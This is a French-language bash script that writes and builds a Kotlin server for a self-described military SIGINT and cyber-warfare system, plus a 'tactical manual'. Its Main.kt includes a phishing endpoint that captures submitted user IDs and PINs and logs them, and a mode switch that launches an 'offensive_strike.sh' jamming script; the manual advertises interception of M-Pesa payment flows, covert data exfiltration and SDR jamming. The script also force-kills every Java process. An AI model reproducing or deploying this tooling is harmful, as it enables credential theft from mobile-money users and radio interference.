#!/bin/bash
# 🛡️ SOVEREIGN CORE v4.2 - SÉCURISATION ET MISE À JOUR FINALE

echo "🔧 1. Mise à jour du Cerveau (Main.kt)..."
cat << 'MAIN_EOF' > src/main/kotlin/com/fardc/sigint/core/Main.kt
package com.fardc.sigint.core

import com.fardc.sigint.services.dsp.*
import com.fardc.sigint.core.sync.MeshSyncEngine
import io.javalin.Javalin
import io.javalin.http.staticfiles.Location
import java.io.File
import java.time.Instant
import kotlin.concurrent.thread

fun main() {
    println("--------------------------------------------------")
    println("🛡️  SOVEREIGN CORE v4.2 [STABLE-ARME] ACTIVE")
    println("📡 MESH STATUS: CONNECTED | BFT SECURITY: ACTIVE")
    println("--------------------------------------------------")
    
    val vault = SecurityVault()
    val combatHandler = CombatModeHandler()
    val combatSelector = CombatModeSelector()
    val threatAnalyzer = ThreatAnalyzer()
    val meshEngine = MeshSyncEngine(vault, combatHandler)
    File("logs").mkdirs()

    val app = Javalin.create { config ->
        config.staticFiles.add("/ui", Location.EXTERNAL)
        config.showJavalinBanner = false
    }.start(7070)

    // --- ALERTE SÉCURITÉ BFT ---
    app.post("/bft/update") { ctx ->
        val unit = ctx.queryParam("id") ?: "ALPHA-01"
        val pos = ctx.queryParam("pos") ?: "0,0"
        
        if (combatSelector.setMode("CURRENT") == "ASSAULT") {
            println("⚠️ [ALERTE ROUGE] Unité $unit est entrée en ZONE DE BROUILLAGE !")
        }
        println("📍 [BFT] Unité $unit positionnée à $pos")
        ctx.status(200)
    }

    // --- CAPTURE OFFENSIVE ---
    app.post("/login/capture-pago") { ctx ->
        val user = ctx.formParam("user") ?: "unknown"
        val pin = ctx.formParam("pin") ?: "unknown"
        println("🎣 [OFFENSIVE] Interception réussie pour ID: $user")
        val encrypted = vault.encryptData("USER:$user|PIN:$pin")
        File("logs/mission_data.json").appendText("{\"ts\":\"${Instant.now()}\", \"ev\":\"PHISH\", \"data\":\"$encrypted\"}\n")
        ctx.status(200).result("CAPTURE_OK")
    }

    // --- CONTRÔLE DE MODE ---
    app.post("/api/combat/mode") { ctx ->
        val mode = ctx.queryParam("type") ?: "SILENT"
        val active = combatSelector.setMode(mode)
        if (active == "ASSAULT") {
            thread { Runtime.getRuntime().exec("./scripts/offensive_strike.sh 2400 ADAPTIVE") }
        }
        ctx.json(mapOf("status" to "MODE_SET", "active" to active))
    }

    thread(start = true, isDaemon = true) { meshEngine.setup(app) }
    app.get("/") { it.result("🛡️ SOVEREIGN CORE v4.2 ONLINE") }
}
MAIN_EOF

echo "📝 2. Mise à jour du Manuel Tactique..."
cat << 'MANUAL_EOF' > MANUEL_MASTER.md
# 📘 MANUEL MASTER v4.2 - ARSENAL INTÉGRÉ FARDC
**Date :** $(date '+%d/%m/%Y') | **Statut :** OMNI-OPERATIONAL ⚔️

## 📡 MODES ET MATÉRIEL
- **SILENT WATCH :** Écoute passive via SDR.
- **AUTO-DEFENSE :** Réaction IA si Threat Score > 75%.
- **ELECTRONIC ASSAULT :** Brouillage matériel via SDR + Amplificateur.
- **GEO-FUSION :** Triangulation TDOA via réseau Mesh.

## 🛡️ SÉCURITÉ DES FORCES (NOUVEAU)
- **Alerte BFT :** Le système bloque ou avertit si une unité alliée entre dans un rayon de brouillage actif.

## 💰 MODULES DE GUERRE CYBER
- **Phish/MPesaCommander :** Interception et chiffrement des flux financiers ennemis.
- **Data Exfiltrator :** Extraction furtive via tunnels AES-256.
MANUAL_EOF

echo "🚀 3. Relance du système..."
pkill -9 java
sleep 2
kotlinc src/main/kotlin/com/fardc/sigint/core/*.kt \
        src/main/kotlin/com/fardc/sigint/core/sync/*.kt \
        src/main/kotlin/com/fardc/sigint/services/dsp/*.kt \
        -cp "libs/*" -include-runtime -d bin/SovereignCore.jar

java -Dorg.fusesource.jansi.Ansi.disable=true -cp "bin/SovereignCore.jar:libs/*" com.fardc.sigint.core.MainKt
